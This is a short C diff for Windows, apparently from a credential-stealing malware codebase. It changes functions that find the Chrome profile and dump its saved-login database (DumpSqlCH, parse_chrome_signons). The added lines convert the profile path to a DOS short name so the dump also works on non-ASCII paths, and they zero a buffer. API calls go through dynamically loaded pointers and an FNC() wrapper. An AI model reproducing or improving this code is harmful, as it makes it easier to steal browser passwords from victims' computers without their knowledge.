@@ -30,6 +30,7 @@ HMODULE libsqlch = NULL;
 
 extern int DirectoryExists(WCHAR *path);
 extern char *HM_CompletePath(char *file_name, char *buffer);
+extern char *GetDosAsciiName(WCHAR *orig_path);
 
 int InitCHLibs()
 {
@@ -117,13 +118,18 @@ int parse_chrome_signons(void *NotUsed, int argc, char **argv, char **azColName)
 int DumpSqlCH(WCHAR *profilePath, WCHAR *signonFile)
 {
 	void *db;
+	char *ascii_path;
 	CHAR sqlPath[MAX_PATH];
 	int rc;
 
 	if (chrome_SQLITE_open == NULL)
 		return 0;
 
-	sprintf_s(sqlPath, MAX_PATH, "%S\\%S", profilePath, signonFile);
+	if (!(ascii_path = GetDosAsciiName(profilePath)))
+		return 0;
+
+	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
+	SAFE_FREE(ascii_path);
 
 	if ((rc = chrome_SQLITE_open(sqlPath, &db)))
 		return 0;
@@ -141,6 +147,7 @@ WCHAR *GetCHProfilePath()
 	WCHAR appPath[MAX_PATH];
 	static WCHAR FullPath[MAX_PATH];
 
+	memset(appPath, 0, sizeof(appPath));
 	if (!FNC(SHGetSpecialFolderPathW)(NULL, appPath, CSIDL_LOCAL_APPDATA, TRUE))
 		return NULL;
 
